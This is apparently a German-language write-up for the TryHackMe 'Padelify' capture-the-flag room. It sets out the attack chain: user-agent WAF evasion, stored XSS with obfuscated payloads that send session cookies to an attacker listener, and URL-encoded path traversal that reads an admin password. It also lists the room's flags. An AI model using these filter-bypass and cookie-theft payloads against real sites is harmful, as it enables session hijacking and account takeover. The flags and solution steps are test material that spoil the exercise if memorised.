# Padelify – Technische Referenz

## Angriffsablauf

### Phase 1: Enumeration

1. **Nmap-Scan** → Ports 22 (SSH) + 80 (HTTP)
2. **WAF-Erkennung:** Gobuster/Dirbuster mit Standard-UA wird geblockt (403)
   - **Bypass:** Realistischen User-Agent setzen (z.B. Chrome auf Windows)
3. **Directory-Scan** findet:
   - `/logs/error.log` → **lesbar** (enthält XSS-Hinweise)
   - `/config/app.conf` → **403 Forbidden** (WAF blockiert direkten Zugriff)
   - `/login.php`, `/register.php`, `/dashboard.php`
4. **error.log analysieren:**
   - Zeigt XSS-Versuche die nur gewarnt (nicht geblockt) wurden
   - Hinweis auf Encoding-Bypasses
   - Bestätigt: `HttpOnly` Flag ist **nicht gesetzt** auf PHPSESSID

### Phase 2: Flag 1 – Moderator (Stored XSS → Cookie Theft)

**Kernproblem:** Registrierung wird von Moderator manuell geprüft → Stored XSS möglich.

**WAF blockiert:**
- `<script>` Tags
- `document.cookie` (Wort "cookie")
- `<img>` mit `onerror`/`onload`
- `fetch()` direkt

**WAF-Bypass-Payloads (funktionierend):**

```html
<!-- Variante 1: iframe + String-Concat (umgeht "cookie"-Filter) -->
<iframe onload="new Image().src='http://ATTACKBOX:8000/?c='+document['coo'+'kie']">

<!-- Variante 2: body + eval(atob()) Base64-Encode (umgeht fetch+cookie Filter) -->
<body onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9BVFRBQ0tCT1g6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">
<!-- Base64 decoded: fetch('http://ATTACKBOX:8000/?c='+document.cookie) -->

<!-- Variante 3: iframe + eval(atob()) + Concat -->
<iframe onload="eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vQVRUQUNLQk9YOjgwMDAvP2M9Jytkb2N1bWVudFsnY29vJysna2llJ10='))">
```

**Ablauf:**
1. HTTP-Listener starten auf AttackBox (`python3 -m http.server 8000`)
2. XSS-Payload als Username im Registrierungsformular eingeben
3. Warten bis Moderator die Registrierung reviewt (~30-120 Sekunden)
4. Moderator-Browser führt XSS aus → PHPSESSID wird an Listener gesendet
5. Gestohlenen Cookie in Browser einsetzen (DevTools → Storage → Cookies)
6. Seite neu laden → Dashboard mit **Flag 1**

**Flag 1:** `THM{Logged_1n_Moderat0r}`

### Phase 3: Flag 2 – Admin (Directory Traversal / LFI)

**Voraussetzung:** Moderator-Session (aus Phase 2)

**Schritt-für-Schritt:**

1. Dashboard öffnen mit Moderator-Cookie → auf **"Live"** Link klicken
2. URL-Parameter analysieren: `dashboard.php?page=live.php` oder `/live.php?page=match.php`
3. LFI-Test mit unencoded Payload: `?page=../../config/app.conf` → **WAF blockiert (403)**
4. **WAF-Bypass via URL-Encoding** (Punkt UND Slash müssen encoded sein):
   - `/` → `%2F`
   - `.` → `%2E`
   - ✅ **Funktioniert:** `?page=..%2Fconfig%2Fapp%2Econf`
   - ❌ Nicht ausreichend: `?page=../config/app%2Econf` (Slash nicht encoded)
5. `app.conf` auslesen (HTML-Page mit Config-Snippet):
   ```
   admin_info = "bL}8,S9W1o44"
   ```
6. Login-Seite öffnen: `/login.php`
7. Credentials einsetzen: `admin` / `bL}8,S9W1o44` → Admin-Dashboard
8. Flag 2 wird auf der Admin-Seite angezeigt

**Flag 2:** `THM{Logged_1n_Adm1n001}`

**Wichtig für diese Phase:**
- Moderator-Session braucht nicht abgelaufen zu sein
- URL-Encoding ist **essentiell** – auch `.` muss `%2E` sein
- `app.conf` wird als HTML-Page mit eingebettetem Config-Snippet zurückgegeben (nicht als reines Config-File)
- Admin-Passwort variiert (`bL}8,S9W1o44` oder ähnlich – aus `app.conf` extrahieren)

## WAF-Bypass-Techniken (Zusammenfassung)

| Technik | Was umgangen wird | Beispiel |
|---------|-------------------|----------|
| Realistischer UA | UA-basierte Blockierung | `Mozilla/5.0 (Windows NT 10.0; ...)` |
| String-Concatenation | Keyword-Filter ("cookie") | `document['coo'+'kie']` |
| `eval(atob(...))` | Payload-Signatur-Erkennung | Base64-codierter JS-Code |
| `<iframe onload>` | Tag-basierte Filter (`<script>`, `<img onerror>`) | `<iframe onload="...">` |
| URL-Encoding (LFI) | Pfad-Traversal-Filter | `%2E%2E%2Fconfig%2Fapp%2Econf` |
| Punkt-Encoding | Dateiendungs-Filter | `.conf` → `%2Econf` |

## Nützliche Endpoints

| Pfad | Beschreibung | Zugriff | Hinweise |
|------|-------------|--------|----------|
| `/` | Registrierungsseite | Public | Formular für XSS-Injection (Flag 1) |
| `/login.php` | Login-Formular | Public | Username/Password-Login für Flag 2 |
| `/logs/error.log` | WAF-/App-Fehlerlogs | Public | Hints zu Bypass-Techniken |
| `/config/app.conf` | App-Config (Admin-PW) | 403 direkt, via LFI | Direktzugriff WAF-blockiert, LFI funktioniert |
| `/dashboard.php` | Moderator-Dashboard | Moderator-Session | Flag 1 sichtbar nach Login |
| `/live.php` oder `/dashboard.php?page=live.php` | Live-Seite mit LFI-Vektor | Moderator-Session | Das `?page=` Parameter ist LFI-anfällig |
| `/dashboard.php?page=%2E%2E%2Fconfig%2Fapp%2Econf` | LFI-Exploit für app.conf | Moderator-Session | URL-Encoded Payload (der kritische String) |

## Debugging-Tipps

**Problem: 403 Forbidden bei allen Payloads**
- WAF hat möglicherweise geblockt → einige Minuten warten
- `/status` Page im THM-Interface zeigt Server-Status
- Server neu starten behebt WAF-Block

**Problem: LFI funktioniert nicht**
- Prüfe ob Moderator-Session noch gültig ist (reauth mit neuem Cookie)
- Stelle sicher **BEIDES** ist encoded: `/` → `%2F` UND `.` → `%2E`
- Versuche verschiedene Pfade: `..%2F` vs `%2E%2E%2F`

**Problem: Admin-Login sagt "denied" aber Passwort ist richtig**
- Cookie-Session nach Login abfangen (in Response-Header)
- Mit neuem Admin-Cookie auf Dashboard/Flag-Seite zugreifen
- Verschiedene Dashboard-Pfade probieren

## Quellen

- [Writeup 1 – Domoon](https://domoon.medium.com/padelify-thm-writeup-f8917e721a48)
- [Writeup 2 – Avyukt Security / InfoSec Write-ups](https://infosecwriteups.com/padelify-thm-writeup-5f30dd31009f)
